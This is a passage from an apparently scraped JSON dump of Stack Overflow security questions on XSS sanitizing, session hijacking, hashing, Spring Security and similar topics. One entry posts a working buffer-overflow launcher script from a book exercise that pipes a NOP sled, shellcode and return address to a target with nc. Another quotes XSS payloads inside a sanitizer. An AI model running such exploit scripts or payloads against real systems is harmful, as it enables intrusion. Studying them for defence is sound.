step-by-step how to implement that encryption method using php?</p>\n"},{"tags":["c#",".net","javascript","asp.net-mvc","security"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1698,"score":3,"question_id":2962038,"title":"How to remove dangerous characters(ie script tags)?","body":"<p>I am wondering is there any sort of C# class or 3rd party library that removes dangerous characters such as script tags?</p>\n\n<p>I know you can use regex but I also know people can write their script tags so many ways that you can fool the regex into thinking it is OK.</p>\n\n<p>I also heard that <a href=\"http://htmlagilitypack.codeplex.com/\" rel=\"nofollow\">HTML Agility Pack</a> is good so I am wondering is there any script removal class made for it?</p>\n\n<p><strong>Edit</strong></p>\n\n<p><a href=\"http://htmlagilitypack.codeplex.com/Thread/View.aspx?ThreadId=24346\" rel=\"nofollow\">http://htmlagilitypack.codeplex.com/Thread/View.aspx?ThreadId=24346</a></p>\n\n<p>I found this on their forms. However I am not sure if this is complete solution as the guy does not have any tests to back it up and it would be nicer if this was on some site where tons of people where using this script every day to test to see if anything gets by.</p>\n\n<blockquote>\n  <p>Great example (almost), Thanks!  A few\n  ways to make it stronger that I saw,\n  though:</p>\n  \n  <p>1) Use case-insensitive search when\n  looking for links with \"javascript:\",\n  \"vbscript:\", \"jscript:\".  For example,\n  the original example would not remove\n  the HTML:</p>\n\n<pre><code>&lt;a href=\"JAVAscRipt:alert('hi')\"&gt;click&gt; me&lt;/a&gt;\n</code></pre>\n  \n  <p>2) Remove any style attributes that\n  contain an expression rule.  Internet\n  Explorer evaluates the CSS rule\n  express as script.  For example, the\n  following would product a message box:</p>\n\n<pre><code>&lt;div style=\"width:expression(alert('hi'));\"&gt;bad&gt; code&lt;/div&gt;\n</code></pre>\n  \n  <p>3) Also remove  tags</p>\n  \n  <p>I honestly have no idea why\n  \"expression\" has not been removed from\n  IE - major flaw in my opinion. (Try\n  the div example in internet explorer\n  and you'll see why - even IE8.)  I\n  just wish there was an easier/standard\n  way to clean-up html input from a\n  user.</p>\n</blockquote>\n\n<p>Here's the code updated with these improvements.  Let me know if you see anything wrong:</p>\n\n<pre><code>    public string ScrubHTML(string html)\n    {\n        HtmlDocument doc = new HtmlDocument();\n        doc.LoadHtml(html);\n\n        //Remove potentially harmful elements\n        HtmlNodeCollection nc = doc.DocumentNode.SelectNodes(\"//script|//link|//iframe|//frameset|//frame|//applet|//object|//embed\");\n        if (nc != null)\n        {\n            foreach (HtmlNode node in nc)\n            {\n                node.ParentNode.RemoveChild(node, false);\n\n            }\n        }\n\n        //remove hrefs to java/j/vbscript URLs\n        nc = doc.DocumentNode.SelectNodes(\"//a[starts-with(translate(@href, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'javascript')]|//a[starts-with(translate(@href, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'jscript')]|//a[starts-with(translate(@href, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'vbscript')]\");\n        if (nc != null)\n        {\n\n            foreach (HtmlNode node in nc)\n            {\n                node.SetAttributeValue(\"href\", \"#\");\n            }\n        }\n\n\n        //remove img with refs to java/j/vbscript URLs\n        nc = doc.DocumentNode.SelectNodes(\"//img[starts-with(translate(@src, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'javascript')]|//img[starts-with(translate(@src, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'jscript')]|//img[starts-with(translate(@src, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'vbscript')]\");\n        if (nc != null)\n        {\n            foreach (HtmlNode node in nc)\n            {\n                node.SetAttributeValue(\"src\", \"#\");\n            }\n        }\n\n        //remove on&lt;Event&gt; handlers from all tags\n        nc = doc.DocumentNode.SelectNodes(\"//*[@onclick or @onmouseover or @onfocus or @onblur or @onmouseout or @ondoubleclick or @onload or @onunload]\");\n        if (nc != null)\n        {\n            foreach (HtmlNode node in nc)\n            {\n                node.Attributes.Remove(\"onFocus\");\n                node.Attributes.Remove(\"onBlur\");\n                node.Attributes.Remove(\"onClick\");\n                node.Attributes.Remove(\"onMouseOver\");\n                node.Attributes.Remove(\"onMouseOut\");\n                node.Attributes.Remove(\"onDoubleClick\");\n                node.Attributes.Remove(\"onLoad\");\n                node.Attributes.Remove(\"onUnload\");\n            }\n        }\n\n        // remove any style attributes that contain the word expression (IE evaluates this as script)\n        nc = doc.DocumentNode.SelectNodes(\"//*[contains(translate(@style, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'expression')]\");\n        if (nc != null)\n        {\n            foreach (HtmlNode node in nc)\n            {\n                node.Attributes.Remove(\"stYle\");\n            }\n        }\n\n        return doc.DocumentNode.WriteTo();\n    } \n</code></pre>\n"},{"tags":["php","security","session"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12083087,"title":"Session security using session_id","body":"<p>I'm working on a login script. When the user successfully logs in I set <code>$_SESSION['logged_in'] = TRUE;</code> </p>\n\n<p>Then, I simply check on other pages if <code>$_SESSION['logged_in'] = TRUE;</code> If so, I display the appropriate content</p>\n\n<p>Everything works fine, but now I'm adding more security. Would it be beneficial for me to check the <code>session_id</code> of the current user against the <code>session_id</code> stored in the database upon login? Would this help prevent session hijacking? If not, are there other preventative measures I should be taking?</p>\n"},{"tags":["git","security","gpg"],"answer_count":2,"favorite_count":1,"up_vote_count":9,"down_vote_count":0,"view_count":87,"score":9,"question_id":12038073,"title":"Git: Is it possible to fake the signing date of a tag?","body":"<p>As a scientist I would like to keep some official record of the time I check something into my Git repository. This in order to later back up claims of who invented what first during for instance patent disputes.</p>\n\n<p>At the moment I from time to time add a tag to my repository like so:</p>\n\n<pre><code>git tag -s -m \"`date`\" 2012-08-20\n</code></pre>\n\n<p>and push the tags to the central server:</p>\n\n<pre><code>git push --tags\n</code></pre>\n\n<p>Pulling up a tag shows the date I signed it with my key:</p>\n\n<pre><code>git tag -v 2012-08-20\nobject 2d6f6035270e8e44c035431e99be8da3fccee095\ntype commit\ntag 2012-08-20\ntagger My Full Name &lt;name@institution&gt; 1345466433 +0200\n\nMon Aug 20 14:40:33 CEST 2012\ngpg: Signature made Mon Aug 20 14:40:37 2012 CEST using RSA key ID somekey\ngpg: Good signature from \"My Full Name &lt;name@institution&gt;\"\ngpg:                 aka \"My Full Name &lt;personal-email&gt;\"\n</code></pre>\n\n<p>My question is how secure these dates are? Is it possible tamper with them later on?</p>\n\n<p>EDIT: to clarify a but further, I wish to be able to prove that it would be very unlikely that I tampered with the tags later on.</p>\n"},{"tags":["security","bash","shell","gdb"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":87,"score":2,"question_id":12078676,"title":"Can this bash script be more concise?","body":"<p>Main Point: Can this script be cleaner and more concise?</p>\n\n<p>So I'm working through Art of Exploitation by Erickson, and he walks through the development of an automated tool to make the exploitation of his tinywebserver daemon faster. </p>\n\n<p>However, on Ubuntu 10.04, the Return Address changes each time the daemon is restarted. I adjusted the script to automate getting the return address from GDB. I've never done any scripting before, and the script below works, but I was wondering if it could be cleaner, especially the GDB line.</p>\n\n<p>Basically, I start the daemon, then get the pid. Then I automate running GDB in order to get the correct return address. This gets saved to a logfile.</p>\n\n<p>I use cut to get the return address, sed to space it, and awk to format it properly for the shellcode.</p>\n\n<p>Everything else is from the book.</p>\n\n<p>Any feedback on the gdb line and the cut/sed/awk lines?</p>\n\n<p>Thanks for any advice.</p>\n\n<pre><code>#!/bin/sh\n# a tool for exploiting tinywebd\n\nif [ -z \"$2\" ]; then  # if argument 2 is blank\n   echo \"Usage: $0 &lt;shellcode file&gt; &lt;target IP&gt;\"\n   exit\nfi \n\n./tinywebd\npid=$(pidof tinywebd)\n\nOFFSET=524  # changed to work on eve\n\n#RETADDR=\"\\xe4\\x9a\\xd2\\xbf\" # \nsudo gdb -q -pid=$pid --symbols=./tinywebd --batch -ex \"break 86\" \n--batch -ex \"c\"--batch -ex \"set logging on gdblog\" --batch -ex \"x/x request+100\"\n--batch -ex \"set logging off\" --batch -ex \"quit\"\n\nRETADDR=$(cut -d: -f1 gdblog | sed 's/\\(.\\{2\\}\\)/\\1 /g' | \nawk '{ print \"\\\\x\"$5\"\\\\x\"$4\"\\\\x\"$3\"\\\\x\"$2}')\nrm -f gdblog\n\necho \"target IP: $2\"\nSIZE=`wc -c $1 | cut -f1 -d ' '`\necho \"shellcode: $1 ($SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE))\n\necho \"[NOP ($ALIGNED_SLED_SIZE bytes)] [shellcode ($SIZE bytes)] [ret addr ($((4*32)) \nbytes)]\"\n( perl -e \"print \\\"\\x90\\\"x$ALIGNED_SLED_SIZE\";\n cat $1;\n perl -e \"print \\\"$RETADDR\\\"x32 . \\\"\\r\\n\\\"\";) | nc -w 1 -v $2 80\n</code></pre>\n"},{"tags":["windows","security","uac"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":71,"score":2,"question_id":12049469,"title":"is it ok to store executables in programdata?","body":"<p>is it ok to store executables in programdata or appdata? \nThe result is that i can modify it (update it) without having to display the uac warning, but on the other hand so can any other application..</p>\n\n<p>Note: It seems that google chrome is doing this.</p>\n"},{"tags":["security","sockets","tcp","https"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12073970,"title":"What is difference between HTTPS and TCP over SSL","body":"<p>I am working on a DotNet client application which will send message to Java server over HTTPS. Prior to this one of my team member has developed a application which uses tcp client with ssl to communicate with server. Kindly help me that if I use his exising code than what are the changes I need to do for Https communication in Dot Net.</p>\n"},{"tags":["spring","security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":78,"score":0,"question_id":12075130,"title":"spring security will not redirect to correct page","body":"<p>I use spring security in my project but it's not acting as correct as I want.\nI want when I log in as an administrator I can be redirected to admin pages and not to users pages which is the case right now. Want even when I logged in it's not permitted to  go to those pages I don't have authority for.</p>\n\n<p>The structure of my view is: </p>\n\n<p>views---><br/>\nusers<br/>\n     -->index.jsp<br/>\n     --->....othe pages<br/>\n<br/>\n admin<br/>\n      --->addNewUser.jsp<br/>\n      --->search.jsp<br/>\n       ---> other pages<br/></p>\n\n<p>spring-security.xml is:</p>\n\n<pre><code>    &lt;beans:beans xmlns=\"http://www.springframework.org/schema/security\"\nxmlns:beans=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org   /2001/XMLSchema-instance\"\nxsi:schemaLocation=\"http://www.springframework.org/schema/beans\nhttp://www.springframework.org/schema/beans/spring-beans-3.0.xsd\nhttp://www.springframework.org/schema/security\nhttp://www.springframework.org/schema/security/spring-security-3.0.3.xsd\"&gt;\n\n&lt;http auto-config=\"true\" use-expressions=\"true\"&gt;\n\n    &lt;!-- interceptor pages --&gt;\n    &lt;intercept-url pattern=\"/index\" access=\"permitAll\" /&gt;\n    &lt;intercept-url pattern=\"/users/**\" access=\"hasRole('ROLE_USER')\" /&gt;\n    &lt;intercept-url pattern=\"/admin/**\" access=\"hasRole('ROLE_ADMIN')\" /&gt;\n    &lt;intercept-url pattern=\"/logout\" access=\"permitAll\" /&gt;\n    &lt;intercept-url pattern=\"/denied\" access=\"permitAll\" /&gt;\n    &lt;access-denied-handler error-page=\"/403\" /&gt;\n\n    &lt;form-login login-page=\"/index\" default-target-url=\"/welcome\"\n        authentication-failure-url=\"/loginfailed\" /&gt;\n\n    &lt;logout logout-success-url=\"/logout\" /&gt;\n\n&lt;/http&gt;\n\n&lt;authentication-manager&gt;\n    &lt;authentication-provider&gt;\n        &lt;jdbc-user-service data-source-ref=\"dataSource\"\n            users-by-username-query=\"\n            select username,password,'true' AS isEnabled from USER where USERNAME=?\"\n\n            authorities-by-username-query=\"\n            select u.username ,r.`ROLE_NAME` from USER u, USER_ROLE ur,ROLE r where (u.user_id = ur.user_id) \n            and (r.role_id=ur.role_id) and u.username =? \" /&gt;\n    &lt;/authentication-provider&gt;\n&lt;/authentication-manager&gt;\n</code></pre>\n\n<p></p>\n\n<p>mvc-dispatcher.xml</p>\n\n<pre><code>    &lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\nxmlns:context=\"http://www.springframework.org/schema/context\"\nxmlns:mvc=\"http://www.springframework.org/schema/mvc\" xmlns:xsi=\"http://www.w3.org  /2001/XMLSchema-instance\"\nxsi:schemaLocation=\"\n    http://www.springframework.org/schema/beans     \n    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd\n    http://www.springframework.org/schema/mvc\n    http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd\n    http://www.springframework.org/schema/context \n    http://www.springframework.org/schema/context/spring-context-3.0.xsd\"&gt;\n\n&lt;context:component-scan base-package=\"se.guards.weblayer\" /&gt;\n&lt;mvc:annotation-driven /&gt;\n&lt;context:annotation-config /&gt;\n\n&lt;mvc:resources mapping=\"/resources/**\" location=\"/resources/\" /&gt;\n\n&lt;bean\n    class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\"&gt;\n    &lt;property name=\"prefix\" value=\"/WEB-INF/views/users/\" /&gt;\n    &lt;property name=\"suffix\" value=\".jsp\" /&gt;\n&lt;/bean&gt;\n\n&lt;bean id=\"messageSource\"\n    class=\"org.springframework.context.support.ResourceBundleMessageSource\"&gt;\n    &lt;property name=\"basenames\" value=\"mymessages\"&gt;&lt;/property&gt;\n&lt;/bean&gt;\n\n&lt;bean\n      class=\"org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter\" /&gt;\n&lt;bean\n    class=\"org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping\" /&gt;\n</code></pre>\n\n<p></p>\n\n<p>And when I remove users from  \nit will not work. \nI think I'm missing with the spring security but don't know what? \nWill be glad for any help.</p>\n"},{"tags":["forms","security","cakephp","components","fieldlist"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12071511,"title":"Cakephp form submission - $fieldList and Security component","body":"<p>Let's assume that the Security Component in cakephp is enabled.</p>\n\n<p>When creating a form, for example for user registration (/users/add), is it needed to use the $fieldList when saving the data in the controller:</p>\n\n<pre><code>$this-&gt;User-&gt;save($this-&gt;request-&gt;data, true, $fieldList);\n</code></pre>\n\n<p>Or the allowed fields are already defined and guarded by the Security Component?</p>\n\n<p>Thank you!</p>\n"},{"tags":["sql-server","security","ftp"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12072000,"title":"sql server secure ftp","body":"<p>Is there a way that can do secure ftp using sql server 2005? I need to secure ftp to some server and pull a file. It would be best to do it using T-SQL, if not, any other way?\nActually I already googled a bit and below is my results, I have no experience with CLR, some experience with SSIS. I would like to here your suggestions regarding these two approaches or any other way?</p>\n\n<ol>\n<li>using SSIS with third party component. SSIS is integrated ETL tool of SQL Server 2005. It has a ftp component but it can only do FTP not secure ftp. But there are many third party components developed for SSIS that can do SFTP. SSIS can use these third party components to achieve SFTP function. Then the SSIS task can be scheduled in SQL agent job.</li>\n<li>use CLR (common language runtime), which is using .NET code to extend the ability of SQL server. E.g. using .NET code to generate some class which can do SFTP job, then this can be integrated into SQL server as a stored procedure kind of thing. Then it can be called from within T-SQL code/stored procedure.</li>\n</ol>\n\n<p>Thank you,\nNian</p>\n"},{"tags":["javascript","security","code-access-security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12064182,"title":"Bypassing a browser security limitation on my own computer","body":"<p>I'm trying to create a list of languages' directions (Left-To-Right or Right-To-Left. Other directions don't exist in Wikipedia) by their prefixes (en, fr, es, ) in Wikipedia. To do that I wrote a JS code that can be executed on <a href=\"http://meta.wikimedia.org/wiki/List_of_Wikipedias\" rel=\"nofollow\">this page</a> and that stores the data in a variable. The code opens the main page of each Wikipedia and tries to check the direction of the language according to the 'dir' attribute of its <code>&lt;html&gt;</code> element. However, since each Wikipedia has a different domain, the browser won't let me access this data, for security reasons. Is there a browser that would? Is it possible to change my preferences to enable it?</p>\n\n<p>P.S. The code:</p>\n\n<pre><code>var as = document.querySelectorAll('a.extiw'), pre, win, dirByPre = {};\nfor each (var a in as)\n   if (pre = /^http:\\/\\/(\\w+)\\.wikipedia\\.org\\/wiki\\/$/.exec(a.href)) {\n      win = open(pre[0]);\n      win.onload = function () {\n         opener.dirByPre[pre[1]] = document.documentElement.dir;\n         close();\n      };\n   }\n</code></pre>\n\n<p>Thanks a lot!</p>\n"},{"tags":["java","xml","security","xml-signature","xades4j"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":99,"score":1,"question_id":12071988,"title":"An easy way to get signing certificate from pkcs12 keystore usong alias","body":"<p>Can anyone tell me if there is an easy way in xades4j to get a signing certificate from a pkcs12 using his alias ?</p>\n"},{"tags":["php","security","decoding","128bit"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":237,"score":0,"question_id":6503033,"title":"Just want to decode the code into plain text","body":"<p>We would like to know more about function get_rnd_iv() and md5_encrypt()       these function for using 128bit encoding. Now here we just want to know how to decode that code into plain text... </p>\n\n<p>Here is my all code lines.. </p>\n\n<pre><code>function get_rnd_iv($iv_len)\n{\n   $iv = '';\n   while ($iv_len-- &gt; 0) {\n       $iv .= chr(mt_rand() &amp; 0xff);\n   }\n   return $iv;\n}\n\nfunction md5_encrypt($plain_text, $password, $iv_len = 16)\n{\n   $plain_text .= \"\\x13\";\n   $n = strlen($plain_text);\n   if ($n % 16) $plain_text .= str_repeat(\"\\0\", 16 - ($n % 16));\n   $i = 0;\n   $enc_text = get_rnd_iv($iv_len);\n   $iv = substr($password ^ $enc_text, 0, 512);\n   while ($i &lt; $n) {\n       $block = substr($plain_text, $i, 16) ^ pack('H*', md5($iv));\n       $enc_text .= $block;\n       $iv = substr($block . $iv, 0, 512) ^ $password;\n       $i += 16;\n   }\n   return base64_encode($enc_text);\n}\n\nfunction md5_decrypt($enc_text, $password, $iv_len = 16)\n{\n   $enc_text = base64_decode($enc_text);\n   $n = strlen($enc_text);\n   $i = $iv_len;\n   $plain_text = '';\n   $iv = substr($password ^ substr($enc_text, 0, $iv_len), 0, 512);\n   while ($i &lt; $n) {\n       $block = substr($enc_text, $i, 16);\n       $plain_text .= $block ^ pack('H*', md5($iv));\n       $iv = substr($block . $iv, 0, 512) ^ $password;\n       $i += 16;\n   }\n   return preg_replace('/\\\\x13\\\\x00*$/', '', $plain_text);\n}\n?&gt;\n</code></pre>\n"},{"tags":["php","security","client-server","web-security"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12070165,"title":"How to hide apache server version?","body":"<p>1] When i open any web page &amp; view source it. We have JS &amp; CSS. While click on that i'm able to see each JS &amp; CSS file.</p>\n\n<p>Can we manage it like while on click .js &amp; .css file not open</p>\n\n<p>2] Website hosted on linux server. Through tools hackers are able to view Apache server version. Any way to hide it?</p>\n"},{"tags":["actionscript-3","security","application","air","sandbox"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":114,"score":1,"question_id":12043716,"title":"AIR Loading server hosted swf into same sandbox","body":"<p>I have an AIR App I'm working on and need to load a swf(always from localhost) which will access some methods in it's parent and vice versa. I'm not concerned with opening gaping security holes in a desktop app though. I've been searching all over but keep hitting walls with each implementation out there. </p>\n\n<p>My current setup loads in the swf and it plays but I get a small error from the sandbox since I'm not in the same one as the app. Does anyone know how to get past this error so there is complete freedom opened up between the AIR app and the swf?</p>\n\n<p><strong>* Security Sandbox Violation *</strong></p>\n\n<p>SecurityDomain 'http://localhost/test.swf' tried to access incompatible context 'app:/Test_Player.swf'</p>\n\n<pre><code>public function loadSWF():void {\n\n//var context:LoaderContext = new LoaderContext();\n//context.checkPolicyFile = true;\n//context.applicationDomain = ApplicationDomain.currentDomain;\n//context.securityDomain = SecurityDomain.currentDomain;\n\nvar req:URLRequest = new URLRequest(swfURL);\nadLoader = new Loader();\n\nvideoCanvas.rawChildren.addChild(adLoader);\n\nloader.contentLoaderInfo.addEventListener(Event.INIT, adLoadedHandler, false, 0, true);\nloader.contentLoaderInfo.addEventListener(IOErrorEvent.IO_ERROR, ioError, false, 0, true);\n\n//loader.load(req, context);\nloader.load(req);\n}\n</code></pre>\n"},{"tags":["php","security","session","memcached","centralized"],"answer_count":0,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":66,"score":1,"question_id":12069600,"title":"What can I use to replace PHP sessions sharing via memcache","body":"<p>I am looking for sharing my PHP sessions so the easiest solution is to use memcache. But I need something more secure, because memcache doesn't have failover, clusterisation, persistence </p>\n\n<p>I thought about Redis, but it doesn't have a PHP module that handle it, so no session_handler</p>\n\n<p>So basically, I need something to manage the sessions in a centralized way and relatively secure. And my research on the internet aren't very fructuous.</p>\n"},{"tags":["php","security","hash","md5","md5-file"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":98,"score":0,"question_id":12068015,"title":"md5 hash of hash","body":"<p>This is theoretical question but I am curious about it. What if I do this (code in PHP, but the language isn't really matter in this case):</p>\n\n<pre><code>$value  = ''; //starting value\n$repeat = false;\n\nwhile(true)\n{\n\n     $value = md5($value);\n\n     /*Save values in database, one row per value*/\n\n     /*Check for repeated hash value in db, and set $repeat flag true if there is one*/\n\n     if($repeat)break;    \n}\n</code></pre>\n\n<p>As you can see I suspect that there will be repeated hash values. I think there is no way that every existing text has its own value as it should mean that every hash value has its own and that doesn't make sense.</p>\n\n<p>My questions are: Is there any article about this \"problem\" out there? It can happen I got the same value in one system for example when I hash files for check if they are valid? Can this caused problems anywhere in any system?</p>\n"},{"tags":["security","asp-classic","owasp"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":11988092,"title":"OWASP in Classic ASP","body":"<p>I am trying to use the OWASP with some Classic ASP app, but did not found much information in how to do it, like a step-by-step.</p>\n\n<p>The site seens to be the startup point: <a href=\"https://www.owasp.org/index.php/Classic_ASP_Security_Project\" rel=\"nofollow\">https://www.owasp.org/index.php/Classic_ASP_Security_Project</a> but someone has a video, or a step-by-step?</p>\n\n<p>Really thankful.</p>\n"},{"tags":["android","security","market"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":380,"score":0,"question_id":10037506,"title":"Android app permissions in ibuildapp.com","body":"<p>Ive been building some android apps using the website ibuildapp.com\nBut the thing is that each app requires so many permissions despite the app does not use these features. My question is, can the app send personal information to their servers? </p>\n"},{"tags":["php","security","session"],"answer_count":5,"favorite_count":0,"up_vote_count":6,"down_vote_count":1,"view_count":691,"score":5,"question_id":8134501,"title":"regenerating session id","body":"<p>I am thinking of using this code on every page to reduce the possibility of session hijacking. By renewing the session_id on every request</p>\n\n<pre><code>if(!empty($_session)){ \n   session_start(); \n}\n</code></pre>\n\n<p>Another way to achieve so would be to do this:</p>\n\n<pre><code>if(!empty($_session)){ \n  session_regenerate_id(true);\n}\n</code></pre>\n\n<p>However, I heard criticisms of that function that say that if the page is refreshed too fast for some reason, the session id becomes invalid.</p>\n\n<p>Another way to use the session id is to have more control over how a session is generated.</p>\n\n<p>There are other ways to achieve so.. Whats the best practice?</p>\n"},{"tags":["java","spring","security","authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":206,"score":0,"question_id":12057326,"title":"How to automatically login as a user using Spring Security without knowing their password?","body":"<p>My application uses Spring Security, and my client requires:</p>\n\n<ul>\n<li>users to be able to automatically login after signup.</li>\n<li>an admin to login as any user without knowing their password.</li>\n</ul>\n\n<p>So I need to figure out how to login as any user automatically without knowing their password.   </p>\n\n<p>How can this be accomplished using Spring Security.</p>\n"},{"tags":["php","security","symfony2","jms"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":100,"score":0,"question_id":12065454,"title":"How can i have custom access denied page in symfony2","body":"<p>I am using JMS Security bundle to secure methods and controllers.\nWhen non previleged user access the secure page then i get this error</p>\n\n<pre><code>Token does not have the required roles.\n</code></pre>\n\n<p>Is there any way , i can make that custom page and more defined error message</p>\n"},{"tags":["security","kerberos"],"answer_count":6,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":800,"score":4,"question_id":2646863,"title":"Kerberos - real world examples?","body":"<p>I know how Kerberos works and understand it purpose but I need some real world examples, where does it fit, and have you ever use it?</p>\n"},{"tags":["java","security","google-app-engine","deployment","google-eclipse-plugin"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":44,"score":2,"question_id":12065662,"title":"Google Eclipse Plugin: Securing the Environment","body":"<p>I just downloaded the Google plugin for Eclipse and have begun to play around with it. One of the coolest, and scariest, features I've found so far is the ability to deploy a web app straight to Google App Engine (the \"production\" environment) right from inside Eclipse (your \"local/dev\" environment).</p>\n\n<p>This is perfectly fine for small projects with a small number of developers who are all core contributors and \"owners\", but the minute you introduce this power to even a moderately-large development team it becomes a double-edge sword.</p>\n\n<p>The fact that a junior developer could possibly blow-out production with a buggy, completely disfunctional version of the app that he/she broke locally terrifies me!</p>\n\n<p>Is there anyway to restrict which <em>user(s)/group(s)</em> can make use of this deployment capability? If not, are there any workarounds or remedies? I can't imagine I'm the first person to be alarmed by this! Thanks in advance!</p>\n"},{"tags":["security","playframework"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":507,"score":0,"question_id":6991557,"title":"Secure in Playframework","body":"<p>I'm trying to install secure module in playframework, I tried with <a href=\"http://www.playframework.org/documentation/1.2.2/secure\" rel=\"nofollow\">http://www.playframework.org/documentation/1.2.2/secure</a> but Secure.class isn't found</p>\n\n<pre><code> import models.Task;\n import play.mvc.Controller;\n import play.mvc.With;\n\n public class Application extends Controller {\n\n     @With(Secure.class)\n     public static void index() {\n</code></pre>\n\n<p>Please any help please</p>\n"},{"tags":["security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12012188,"title":"Whats a decent way to upgrade from SHA1 to SHA256?","body":"<p>I have an existing database with about 1.6 million users in it. Currently the passwords are stored as salted SHA1, I'd like to upgrade them all to salted SHA256.</p>\n\n<p>The approach I've taken so far if to migrate each user as they login, essentially validate their password against the old hash and if it matches create a new stronger hash. This works fine, but it's a slow process.</p>\n\n<p>As far as I can see there is no easy way to shortcut this process. Is there a better way?</p>\n"},{"tags":["security","web-applications"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12062671,"title":"How to secure web applications in production but still provide access to developers","body":"<p>We have number of web applications running in production datacenters which are firewalled from developer machines.<br>\nWeb application itself already has authentication &amp; authorization, but we want to implement another layer of authentication &amp; authorization to determine who can access which application.<br>\nWe don't like to open network acls from all developer machines to production hosts  to avoid security risk.<br>\n<em>Question:</em> What would be the best way to provide developer access to production with valid authentication and authorization(Eg using Kerbores for authentication and NIS for authorization)..? </p>\n"},{"tags":["security","vba","excel-vba","outlook-vba","outlook-2010"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":310,"score":1,"question_id":11926605,"title":"How to avoid the Outlook Security warning for email automation - VBA","body":"<p>I'm trying to send an email from Excel 2010 in VBA, through Outlook 2010. Most other answers on SO don't seem to have any method of using VBA to do this, nor for Outlook/Excel 2010.</p>\n\n<p>Do any free methods exist? The <a href=\"http://www.dimastr.com/redemption/home.htm\" rel=\"nofollow\">Redemption</a> method won't be a viable option, unless it is easy to install on 10 machines inside of a large company. </p>\n\n<p>This is how I currently send emails:</p>\n\n<pre><code>Dim emailAddr As String\nDim OutApp As Object\nDim OutMail As Object\n\nSet OutApp = CreateObject(\"Outlook.Application\")\nSet OutMail = OutApp.CreateItem(0)\nWith OutMail\n .To = \"xxxx@xxxx.edu\"\n .Subject = \"Demande\"\n .HtmlBody = CombinedValueHtml\n .Send\nEnd With\n\nSet OutMail = Nothing\nSet OutApp = Nothing\n\nExit Sub\n</code></pre>\n\n<p>Thanks for all your help in advance.</p>\n"},{"tags":["security","validation","struts2","web-security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12054407,"title":"List of special characters which should be filtered for web application security","body":"<p>What are the various special characters to be filtered in validation.xml in order to make a web application secure?</p>\n"},{"tags":["forms","security","cakephp"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":71,"score":3,"question_id":12053538,"title":"Cakephp 2 security in forms","body":"<p>I have a question about the cakephp2 forms security. Let's assume that we have the Security Component enabled and have already build users authentication, permissions, and product management system.</p>\n\n<p>We need to create an Offer Request feature, which allows users to ask for an offer for a specific product.</p>\n\n<p>The user is logged in and clicks on \"ask\" and goes to /offer_requests/add/product_id</p>\n\n<hr>\n\n<p><strong>Scenario 1:</strong></p>\n\n<p>In the /Views/OfferRequests/add.ctp we have:</p>\n\n<pre><code>&lt;?php \necho $this-&gt;Form-&gt;create('OfferRequest');\necho $this-&gt;Form-&gt;input('user_id', \n                         array('value' =&gt; $this-&gt;Session-&gt;read('Auth.User.id'),\n                               'type' =&gt; 'hidden' ));\necho $this-&gt;Form-&gt;input('product_id');\necho $this-&gt;Form-&gt;input('quantity');\necho 